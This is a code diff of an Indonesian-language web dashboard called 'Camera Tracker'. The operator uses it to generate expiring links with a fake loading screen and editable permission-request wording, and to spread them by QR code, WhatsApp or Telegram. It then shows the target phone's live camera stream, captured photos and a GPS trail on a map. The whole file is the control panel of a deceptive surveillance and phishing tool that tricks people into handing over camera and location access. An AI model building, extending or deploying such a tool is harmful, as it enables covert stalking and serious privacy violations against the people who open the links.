@@ -1,84 +1,487 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>Control Dashboard</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f4f6f9; }
-        .card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input[type="text"], input[type="number"], select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
-        button { background: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
-        .gallery { display: flex; flex-wrap: wrap; gap: 10px; }
-        .gallery img { width: 150px; height: 110px; object-fit: cover; border-radius: 4px; border: 1px solid #ddd; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-        th { background-color: #f2f2f2; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Camera Tracker — Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--bg:#040810;--surface:#0b1628;--elevated:#112240;
+      --border:#1e2d45;--bhi:#2a3f60;--text:#e6edf3;--muted:#4d6a8a;
+      --cyan:#00d4ff;--amber:#f5a623;--green:#00ff41;--red:#e53935}
+    html,body{height:100%;font-family:'Inter',sans-serif;background:var(--bg);color:var(--text)}
+
+    header{height:52px;display:flex;align-items:center;justify-content:space-between;
+      padding:0 20px;background:var(--surface);border-bottom:1px solid var(--border)}
+    .logo{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--cyan);letter-spacing:.06em}
+    .hdr-r{display:flex;align-items:center;gap:12px}
+    .badge{font-family:'JetBrains Mono',monospace;font-size:11px;padding:3px 9px;
+      border-radius:20px;letter-spacing:.06em}
+    .bi{background:rgba(77,106,138,.15);color:var(--muted);border:1px solid var(--border)}
+    .bw{background:rgba(245,166,35,.1);color:var(--amber);border:1px solid rgba(245,166,35,.3)}
+    .bl{background:rgba(0,255,65,.08);color:var(--green);border:1px solid rgba(0,255,65,.3);animation:pulse 1.5s ease-in-out infinite}
+    .be{background:rgba(229,57,53,.1);color:var(--red);border:1px solid rgba(229,57,53,.3)}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.55}}
+    .out-btn{font-size:12px;color:var(--muted);text-decoration:none;
+      padding:5px 12px;border:1px solid var(--border);border-radius:6px}
+
+    main{display:grid;grid-template-columns:340px 1fr;height:calc(100vh - 52px);overflow:hidden}
+
+    /* Left */
+    .left{background:var(--surface);border-right:1px solid var(--border);
+      overflow-y:auto;display:flex;flex-direction:column}
+    .type-tabs{display:flex;border-bottom:1px solid var(--border)}
+    .tab{flex:1;padding:11px 0;text-align:center;font-size:12px;font-weight:500;
+      color:var(--muted);cursor:pointer;border:none;background:none;
+      border-bottom:2px solid transparent;transition:color .2s,border-color .2s;letter-spacing:.04em}
+    .tab:hover{color:var(--text)}
+    .tab.active{color:var(--cyan);border-bottom-color:var(--cyan)}
+
+    .form-area{padding:16px;display:flex;flex-direction:column;gap:11px}
+    .field label{display:block;font-size:10px;text-transform:uppercase;letter-spacing:.08em;
+      color:var(--muted);font-family:'JetBrains Mono',monospace;margin-bottom:4px}
+    .field input,.field textarea,.field select{width:100%;padding:9px 11px;
+      background:var(--bg);border:1px solid var(--border);border-radius:7px;
+      color:var(--text);font-size:13px;outline:none;font-family:'Inter',sans-serif;transition:border-color .2s}
+    .field input:focus,.field textarea:focus{border-color:var(--cyan)}
+    .field textarea{resize:vertical;min-height:58px;line-height:1.5}
+    .row2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+
+    .gen-btn{width:100%;padding:13px;border:1px solid var(--cyan);border-radius:9px;
+      background:transparent;color:var(--cyan);font-size:13px;font-weight:600;
+      font-family:'JetBrains Mono',monospace;letter-spacing:.05em;cursor:pointer;
+      transition:background .2s;display:flex;align-items:center;justify-content:center;gap:7px}
+    .gen-btn:hover:not(:disabled){background:rgba(0,212,255,.08)}
+    .gen-btn:disabled{opacity:.45;cursor:not-allowed}
+
+    .result{padding:14px;border-top:1px solid var(--border);display:none;flex-direction:column;gap:12px}
+    .link-row{display:flex;gap:6px}
+    .link-inp{flex:1;padding:9px 11px;background:var(--bg);border:1px solid var(--border);
+      border-radius:7px;color:var(--cyan);font-family:'JetBrains Mono',monospace;font-size:11px;
+      outline:none;overflow:hidden;text-overflow:ellipsis}
+    .copy-btn{padding:9px 13px;background:var(--elevated);border:1px solid var(--border);
+      border-radius:7px;color:var(--text);font-size:12px;font-family:'JetBrains Mono',monospace;
+      cursor:pointer}
+    .copy-btn:hover{background:#1a3060}
+    .copy-btn.ok{color:var(--green)}
+    .qr-wrap{display:flex;flex-direction:column;align-items:center;gap:8px;
+      padding:14px;background:var(--elevated);border:1px solid var(--border);border-radius:10px}
+    .qr-hint{font-size:11px;color:var(--muted);text-align:center;line-height:1.5}
+    .st-row{display:flex;align-items:center;gap:8px;padding:11px 14px;
+      border-radius:8px;border:1px solid;font-size:13px;font-family:'JetBrains Mono',monospace}
+    .sw{background:rgba(245,166,35,.05);border-color:rgba(245,166,35,.25);color:var(--amber)}
+    .sl{background:rgba(0,255,65,.05);border-color:rgba(0,255,65,.25);color:var(--green)}
+    .se{background:rgba(229,57,53,.05);border-color:rgba(229,57,53,.25);color:var(--red)}
+
+    /* Right */
+    .right{display:flex;flex-direction:column;background:var(--bg)}
+    .vhdr{display:flex;align-items:center;justify-content:space-between;
+      padding:10px 18px;background:var(--surface);border-bottom:1px solid var(--border)}
+    .vt{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);
+      text-transform:uppercase;letter-spacing:.08em}
+    .vmeta{display:flex;gap:14px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted)}
+    .vmeta .v{color:var(--cyan)}
+
+    .vbody{flex:1;position:relative;overflow:hidden}
+
+    /* Placeholder */
+    #vph{position:absolute;inset:0;display:flex;flex-direction:column;
+      align-items:center;justify-content:center;text-align:center;
+      background-image:radial-gradient(#1e2d45 1px,transparent 1px);background-size:24px 24px}
+    .phico{font-size:52px;opacity:.2;margin-bottom:14px}
+    .phtxt{font-size:13px;font-family:'JetBrains Mono',monospace;opacity:.4;line-height:1.6}
+
+    /* Stream */
+    #vs{position:absolute;inset:0;display:none;align-items:center;justify-content:center;background:#000}
+    #simg{max-width:100%;max-height:100%;object-fit:contain;display:none}
+    #rec{position:absolute;top:12px;right:14px;display:none;align-items:center;
+      gap:5px;background:rgba(229,57,53,.8);border-radius:3px;padding:3px 9px;
+      font-size:11px;font-weight:600;letter-spacing:.06em}
+    #rec.on{display:flex}
+    .rdot2{width:7px;height:7px;border-radius:50%;background:#fff;animation:bl 1s step-end infinite}
+    @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
+    #nowait{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+      color:var(--muted);font-size:13px;font-family:monospace}
+    #ssbt{position:absolute;bottom:14px;right:14px;display:none;padding:7px 13px;
+      background:rgba(11,22,40,.85);border:1px solid var(--border);border-radius:6px;
+      color:var(--muted);font-size:12px;font-family:'JetBrains Mono',monospace;cursor:pointer}
+    #ssbt.on{display:block}
+
+    /* Photo */
+    #vp{position:absolute;inset:0;display:none;flex-direction:column}
+    .ptbar{padding:11px 18px;background:var(--surface);border-bottom:1px solid var(--border);
+      display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+    .ptbar span{font-size:12px;color:var(--muted);font-family:'JetBrains Mono',monospace}
+    .pgrid{flex:1;overflow-y:auto;padding:14px;display:grid;
+      grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px;align-content:start}
+    .pcard{background:var(--elevated);border:1px solid var(--border);border-radius:8px;overflow:hidden;cursor:pointer}
+    .pcard img{width:100%;aspect-ratio:4/3;object-fit:cover}
+    .pcinfo{padding:6px 9px;display:flex;justify-content:space-between;align-items:center}
+    .pcinfo span{font-size:10px;color:var(--muted);font-family:monospace}
+    .pdel{font-size:12px;cursor:pointer;color:var(--muted);background:none;border:none;padding:2px 4px}
+    .pdel:hover{color:var(--red)}
+    .nocap{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+      color:var(--muted);font-size:13px;font-family:'JetBrains Mono',monospace}
+
+    /* GPS */
+    #vg{position:absolute;inset:0;display:none;flex-direction:column}
+    #dmap{flex:1;min-height:0}
+    .gbar{padding:11px 18px;background:var(--surface);border-top:1px solid var(--border);
+      display:flex;gap:18px;flex-shrink:0;flex-wrap:wrap}
+    .gs{display:flex;flex-direction:column;gap:2px}
+    .gs label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
+    .gs span{font-size:12px;font-weight:600;color:var(--cyan);font-family:monospace}
+    .ghist{padding:8px 18px 12px;overflow-y:auto;max-height:100px;
+      display:flex;flex-direction:column;gap:3px;flex-shrink:0}
+    .grow{display:flex;gap:10px;font-size:11px;font-family:monospace;color:var(--muted);
+      padding:3px 0;border-bottom:1px solid var(--border)}
+    .grow .cv{color:var(--cyan)}
+
+    /* Lightbox */
+    #lb{position:fixed;inset:0;background:rgba(4,8,16,.92);z-index:9999;
+      display:none;align-items:center;justify-content:center;flex-direction:column;gap:12px}
+    #lb.on{display:flex}
+    #lbimg{max-width:90vw;max-height:80vh;object-fit:contain;border-radius:8px}
+    .lbbtns{display:flex;gap:10px}
+    .lbbtn{padding:8px 16px;border:1px solid var(--border);border-radius:6px;
+      color:var(--text);font-size:13px;background:var(--surface);cursor:pointer}
+  </style>
 </head>
 <body>
+<header>
+  <div class="logo">📷 CAMERA TRACKER</div>
+  <div class="hdr-r">
+    <span class="badge bi" id="gbadge">● IDLE</span>
+    <a href="/logout" class="out-btn">Keluar</a>
+  </div>
+</header>
 
-    <h1>Dashboard Kontrol & Monitoring</h1>
+<main>
+<!-- Left -->
+<div class="left">
+  <div class="type-tabs">
+    <button class="tab active" data-t="stream" onclick="setTab(this,'stream')">📹 STREAM</button>
+    <button class="tab" data-t="photo"  onclick="setTab(this,'photo')">📸 FOTO</button>
+    <button class="tab" data-t="gps"    onclick="setTab(this,'gps')">📍 GPS</button>
+  </div>
 
-    <!-- Form Pengaturan -->
-    <div class="card">
-        <h2>Pengaturan Aplikasi</h2>
-        <form method="POST" action="/dashboard">
-            <div class="form-group">
-                <label>URL Tujuan (Redirect Target via Iframe):</label>
-                <input type="text" name="target_url" value="{{ config.target_url }}" required>
-            </div>
-            <div class="form-group">
-                <label>Mode Operasi:</label>
-                <select name="mode">
-                    <option value="photo" {% if config.mode == 'photo' %}selected{% endif %}>Mode Foto (Auto Capture)</option>
-                    <option value="stream" {% if config.mode == 'stream' %}selected{% endif %}>Mode Streaming</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Interval Pengambilan Foto (Detik):</label>
-                <input type="number" name="photo_interval" value="{{ config.photo_interval }}" min="1" required>
-            </div>
-            <button type="submit">Simpan Konfigurasi</button>
-        </form>
+  <div class="form-area">
+    <div class="field"><label>Judul Loading</label>
+      <input id="flt" value="Memuat Aplikasi"></div>
+    <div class="field"><label>Pesan Loading</label>
+      <input id="fls" value="Mohon tunggu sebentar..."></div>
+    <div class="row2">
+      <div class="field"><label>Durasi Loading (detik)</label>
+        <input id="fld" type="number" value="3" min="1" max="15"></div>
+      <div class="field"><label>Link Berlaku (jam)</label>
+        <input id="fex" type="number" value="1" min="1" max="24"></div>
+    </div>
+    <div class="field"><label>Judul Permintaan Izin</label>
+      <input id="fpt" value="Akses Diperlukan"></div>
+    <div class="field"><label>Pesan Permintaan Izin</label>
+      <textarea id="fpm">Aplikasi ini memerlukan akses untuk berjalan dengan baik.</textarea></div>
+    <div class="field"><label>Pesan Setelah Izin ✏️</label>
+      <textarea id="fcm" placeholder="Contoh: Terima kasih! Data sedang diproses."></textarea></div>
+    <button class="gen-btn" id="gbtn" onclick="generateLink()">
+      <span id="gico">📡</span><span id="glbl">GENERATE LINK</span></button>
+  </div>
+
+  <div class="result" id="result">
+    <div>
+      <div style="font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);
+        font-family:'JetBrains Mono',monospace;margin-bottom:5px">Link</div>
+      <div class="link-row">
+        <input class="link-inp" id="linp" readonly>
+        <button class="copy-btn" id="cpybtn" onclick="copyLink()">Salin</button>
+      </div>
+      <div style="font-size:11px;color:var(--muted);margin-top:4px;font-family:'JetBrains Mono',monospace"
+        id="expnote">⏱ —</div>
+    </div>
+    <div class="qr-wrap">
+      <div id="qrbox"></div>
+      <p class="qr-hint">Scan dari HP atau kirim link via WA / Telegram</p>
+    </div>
+    <div class="st-row sw" id="stbox">
+      <span id="stdot">⏳</span><span id="sttxt">Menunggu perangkat...</span>
+    </div>
+  </div>
+</div>
+
+<!-- Right -->
+<div class="right">
+  <div class="vhdr">
+    <span class="vt" id="vtitle">Live Viewer</span>
+    <div class="vmeta">
+      <span id="vmfps" style="display:none">FPS: <span class="v" id="vfps">—</span></span>
+      <span>Capture: <span class="v" id="vcnt">0</span></span>
+      <span>Token: <span class="v" id="vtok">—</span></span>
+    </div>
+  </div>
+  <div class="vbody">
+    <div id="vph"><div class="phico">📡</div>
+      <div class="phtxt">Generate link untuk mulai memantau<br>Streaming · Foto · GPS</div></div>
+
+    <!-- Stream -->
+    <div id="vs">
+      <img id="simg" src="" alt="stream">
+      <div id="rec"><div class="rdot2"></div>REC</div>
+      <div id="nowait">Menunggu HP membuka link...</div>
+      <button id="ssbt" onclick="screenshot()">📸 Simpan Frame</button>
     </div>
 
-    <!-- Data GPS -->
-    <div class="card">
-        <h2>Log Lokasi GPS</h2>
-        <table>
-            <tr>
-                <th>Waktu</th>
-                <th>Latitude</th>
-                <th>Longitude</th>
-            </tr>
-            {% for item in captured.gps %}
-            <tr>
-                <td>{{ item.timestamp }}</td>
-                <td>{{ item.latitude }}</td>
-                <td>{{ item.longitude }}</td>
-            </tr>
-            {% else %}
-            <tr><td colspan="3">Belum ada data GPS.</td></tr>
-            {% endfor %}
-        </table>
+    <!-- Photo grid -->
+    <div id="vp">
+      <div class="ptbar">
+        <span id="pcnt">0 foto</span>
+        <span style="cursor:pointer;color:var(--muted)" onclick="refreshPhotos()">↻ Refresh</span>
+      </div>
+      <div class="pgrid" id="pgrid"><div class="nocap">Belum ada foto</div></div>
     </div>
 
-    <!-- Data Foto -->
-    <div class="card">
-        <h2>Log Tangkapan Foto</h2>
-        <div class="gallery">
-            {% for img in captured.photos %}
-            <div>
-                <img src="{{ img.url }}" alt="Capture">
-                <div style="font-size:10px;">{{ img.timestamp }}</div>
-            </div>
-            {% else %}
-            <p>Belum ada foto yang diambil.</p>
-            {% endfor %}
-        </div>
+    <!-- GPS map -->
+    <div id="vg">
+      <div id="dmap"></div>
+      <div class="gbar">
+        <div class="gs"><label>Lat</label><span id="dlat">—</span></div>
+        <div class="gs"><label>Lng</label><span id="dlng">—</span></div>
+        <div class="gs"><label>Akurasi</label><span id="dacc">—</span></div>
+        <div class="gs"><label>Update</label><span id="dtime">—</span></div>
+        <div class="gs"><label>Titik</label><span id="dcnt">0</span></div>
+      </div>
+      <div class="ghist" id="ghist"></div>
     </div>
+  </div>
+</div>
+</main>
 
+<!-- Lightbox -->
+<div id="lb">
+  <img id="lbimg" src="" alt="">
+  <div class="lbbtns">
+    <button class="lbbtn" id="lbdl" onclick="lbDl()">⬇ Unduh</button>
+    <button class="lbbtn" onclick="$('lb').classList.remove('on')">✕ Tutup</button>
+  </div>
+</div>
+
+<script>
+let activeToken=null, activeType='stream';
+let streamTimer=null, pollTimer=null, statusTimer=null, photoTimer=null;
+let dMap=null, dMarker=null, dPts=[], dPoly=null;
+let frameCnt=0, fpsCnt2=0, lastFpsMs2=Date.now();
+
+const $ = id => document.getElementById(id);
+
+// ── Tab ──────────────────────────────────────────────────────────────────────
+function setTab(el,t){
+  document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+  el.classList.add('active'); activeType=t;
+  const ico={stream:'📹',photo:'📸',gps:'📍'};
+  const lbl={stream:'GENERATE LINK STREAMING',photo:'GENERATE LINK FOTO',gps:'GENERATE LINK GPS'};
+  $('gico').textContent=ico[t]; $('glbl').textContent=lbl[t];
+}
+
+// ── Generate ─────────────────────────────────────────────────────────────────
+async function generateLink(){
+  const btn=$('gbtn'); btn.disabled=true; $('glbl').textContent='Membuat...';
+  cleanup();
+  const body={
+    type:activeType,
+    loading_title:$('flt').value.trim()||'Memuat Aplikasi',
+    loading_subtitle:$('fls').value.trim()||'Mohon tunggu...',
+    loading_duration:parseInt($('fld').value)||3,
+    permission_title:$('fpt').value.trim()||'Akses Diperlukan',
+    permission_message:$('fpm').value.trim(),
+    custom_message:$('fcm').value.trim(),
+    expires_hours:parseInt($('fex').value)||1,
+  };
+  try {
+    const r=await fetch('/api/generate-link',{method:'POST',
+      headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    const d=await r.json();
+    activeToken=d.token;
+    $('linp').value=d.link;
+    $('vtok').textContent=d.token.slice(0,8)+'…';
+    const exp=new Date(d.expires_at);
+    $('expnote').textContent=`⏱ Berlaku hingga ${exp.toLocaleTimeString('id-ID')}`;
+    $('qrbox').innerHTML='';
+    new QRCode($('qrbox'),{text:d.link,width:148,height:148,
+      colorDark:'#e6edf3',colorLight:'#112240'});
+    const res=$('result'); res.style.display='flex'; res.style.flexDirection='column'; res.style.gap='12px';
+    switchViewer(activeType, d.token);
+    statusTimer=setInterval(()=>pollStatus(d.token),3000);
+  } catch(e){ alert('Error: '+e.message); }
+  finally {
+    btn.disabled=false;
+    const lbl={stream:'GENERATE LINK STREAMING',photo:'GENERATE LINK FOTO',gps:'GENERATE LINK GPS'};
+    $('glbl').textContent=lbl[activeType]||'GENERATE LINK';
+  }
+}
+
+// ── Switch Viewer ─────────────────────────────────────────────────────────────
+function switchViewer(type, token){
+  $('vph').style.display='none';
+  ['vs','vp','vg'].forEach(id=>$(id).style.display='none');
+  const titles={stream:'Live Stream',photo:'Galeri Foto',gps:'Pelacak GPS'};
+  $('vtitle').textContent=titles[type]||'Viewer';
+  if(type==='stream'){
+    $('vs').style.display='flex'; $('vmfps').style.display='inline';
+    startStreamPoll(token);
+  } else if(type==='photo'){
+    $('vp').style.display='flex'; $('vmfps').style.display='none';
+    photoTimer=setInterval(()=>refreshPhotos(token),3000);
+  } else {
+    $('vg').style.display='flex'; $('vmfps').style.display='none';
+    initDashMap();
+    if(pollTimer)clearInterval(pollTimer);
+    pollTimer=setInterval(()=>refreshGPS(token),4000);
+  }
+}
+
+// ── Stream: poll frame dari server ────────────────────────────────────────────
+function startStreamPoll(token){
+  streamTimer=setInterval(async()=>{
+    try{
+      const r=await fetch(`/api/frame/${token}?t=${Date.now()}`);
+      if(r.status===204)return;
+      const blob=await r.blob();
+      const url=URL.createObjectURL(blob);
+      const img=$('simg'), nw=$('nowait');
+      if(img.style.display!=='block'){
+        img.style.display='block'; nw.style.display='none';
+        $('rec').classList.add('on'); $('ssbt').classList.add('on');
+      }
+      img.src=url; setTimeout(()=>URL.revokeObjectURL(url),500);
+      frameCnt++; fpsCnt2++;
+      $('vcnt').textContent=frameCnt.toLocaleString();
+      const now=Date.now();
+      if(now-lastFpsMs2>=2000){
+        $('vfps').textContent=(fpsCnt2*1000/(now-lastFpsMs2)).toFixed(1);
+        fpsCnt2=0; lastFpsMs2=now;
+      }
+    }catch(e){}
+  }, 900);
+}
+
+function screenshot(){
+  const img=$('simg'); if(!img.src)return;
+  const c=document.createElement('canvas');
+  c.width=img.naturalWidth||img.width; c.height=img.naturalHeight||img.height;
+  c.getContext('2d').drawImage(img,0,0);
+  const a=document.createElement('a');
+  a.download=`frame_${Date.now()}.jpg`; a.href=c.toDataURL('image/jpeg',.95); a.click();
+}
+
+// ── Photo Gallery ─────────────────────────────────────────────────────────────
+async function refreshPhotos(token){
+  token=token||activeToken; if(!token)return;
+  try{
+    const r=await fetch(`/api/captures/${token}`);
+    const caps=await r.json();
+    const photos=caps.filter(c=>c.type==='photo');
+    $('pcnt').textContent=`${photos.length} foto`;
+    $('vcnt').textContent=photos.length;
+    if(!photos.length){$('pgrid').innerHTML='<div class="nocap">Belum ada foto</div>';return;}
+    $('pgrid').innerHTML='';
+    photos.forEach(p=>{
+      const t=new Date(p.captured_at).toLocaleTimeString('id-ID');
+      const el=document.createElement('div'); el.className='pcard';
+      el.innerHTML=`<img src="${p.data}" onclick="openLB('${p.data}',${p.id})">
+        <div class="pcinfo"><span>${t}</span>
+        <button class="pdel" onclick="delCap(${p.id})">🗑</button></div>`;
+      $('pgrid').appendChild(el);
+    });
+  }catch(e){}
+}
+
+async function delCap(id){ await fetch(`/api/capture/${id}`,{method:'DELETE'}); refreshPhotos(); }
+
+function openLB(src,id){
+  $('lbimg').src=src; $('lbdl').dataset.src=src; $('lbdl').dataset.id=id;
+  $('lb').classList.add('on');
+}
+function lbDl(){
+  const a=document.createElement('a');
+  a.href=$('lbdl').dataset.src; a.download=`photo_${$('lbdl').dataset.id}.jpg`; a.click();
+}
+
+// ── GPS Dashboard ─────────────────────────────────────────────────────────────
+function initDashMap(){
+  if(dMap){dMap.remove();dMap=null;dMarker=null;dPts=[];}
+  dMap=L.map('dmap').setView([-2.5,118],5);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+    {attribution:'© OpenStreetMap'}).addTo(dMap);
+}
+
+async function refreshGPS(token){
+  token=token||activeToken; if(!token||!dMap)return;
+  try{
+    const r=await fetch(`/api/captures/${token}`);
+    const caps=await r.json();
+    const gps=caps.filter(c=>c.type==='gps');
+    if(!gps.length)return;
+    $('vcnt').textContent=gps.length; $('dcnt').textContent=gps.length;
+    const hist=$('ghist'); hist.innerHTML='';
+    gps.forEach(g=>{
+      const d=JSON.parse(g.data);
+      const t=new Date(g.captured_at).toLocaleTimeString('id-ID');
+      const row=document.createElement('div'); row.className='grow';
+      row.innerHTML=`<span>${t}</span><span class="cv">${parseFloat(d.lat).toFixed(5)}, ${parseFloat(d.lng).toFixed(5)}</span><span>±${Math.round(d.accuracy)}m</span>`;
+      hist.appendChild(row);
+    });
+    gps.forEach(g=>{
+      const d=JSON.parse(g.data);
+      const pos=[parseFloat(d.lat),parseFloat(d.lng)];
+      if(!dPts.find(p=>p[0]===pos[0]&&p[1]===pos[1])){
+        dPts.push(pos); L.circleMarker(pos,{radius:5,color:'#00d4ff',fillOpacity:.7}).addTo(dMap);
+      }
+    });
+    if(dPts.length>1){if(dPoly)dPoly.remove(); dPoly=L.polyline(dPts,{color:'#00d4ff',weight:2,opacity:.5}).addTo(dMap);}
+    const lat=JSON.parse(gps[0].data);
+    const latN=parseFloat(lat.lat), lngN=parseFloat(lat.lng);
+    $('dlat').textContent=latN.toFixed(6); $('dlng').textContent=lngN.toFixed(6);
+    $('dacc').textContent=`±${Math.round(lat.accuracy)}m`;
+    $('dtime').textContent=new Date(gps[0].captured_at).toLocaleTimeString('id-ID');
+    if(!dMarker){dMarker=L.marker([latN,lngN],{icon:L.divIcon({html:'📍',className:'',iconSize:[24,24]})}).addTo(dMap);dMap.setView([latN,lngN],15);}
+    else{dMarker.setLatLng([latN,lngN]);dMap.panTo([latN,lngN]);}
+  }catch(e){}
+}
+
+// ── Status ────────────────────────────────────────────────────────────────────
+async function pollStatus(token){
+  try{
+    const r=await fetch(`/api/status/${token}`);
+    const d=await r.json();
+    const bmap={waiting:['bw','● MENUNGGU'],streaming:['bl','● LIVE'],expired:['be','● EXPIRED']};
+    const [bc,bt]=bmap[d.status]||['bi','● IDLE'];
+    $('gbadge').className='badge '+bc; $('gbadge').textContent=bt;
+    const smap={waiting:['sw','⏳','Menunggu perangkat membuka link...'],
+      streaming:['sl','🔴','Perangkat aktif'],expired:['se','✕','Expired — generate link baru']};
+    const [sc,sd,st]=smap[d.status]||['sw','⏳','—'];
+    $('stbox').className='st-row '+sc; $('stdot').textContent=sd; $('sttxt').textContent=st;
+  }catch(e){}
+}
+
+// ── Copy & Cleanup ────────────────────────────────────────────────────────────
+function copyLink(){
+  navigator.clipboard.writeText($('linp').value).then(()=>{
+    $('cpybtn').textContent='✓ Tersalin!'; $('cpybtn').classList.add('ok');
+    setTimeout(()=>{$('cpybtn').textContent='Salin';$('cpybtn').classList.remove('ok')},2000);
+  });
+}
+
+function cleanup(){
+  [streamTimer,pollTimer,statusTimer,photoTimer].forEach(t=>clearInterval(t));
+  frameCnt=fpsCnt2=0; dPts=[];
+  $('simg').style.display='none'; $('rec').classList.remove('on');
+  $('ssbt').classList.remove('on'); $('nowait').style.display='flex';
+  $('vfps').textContent='—'; $('vcnt').textContent='0';
+}
+
+setTab(document.querySelector('.tab.active'),'stream');
+</script>
 </body>
 </html>
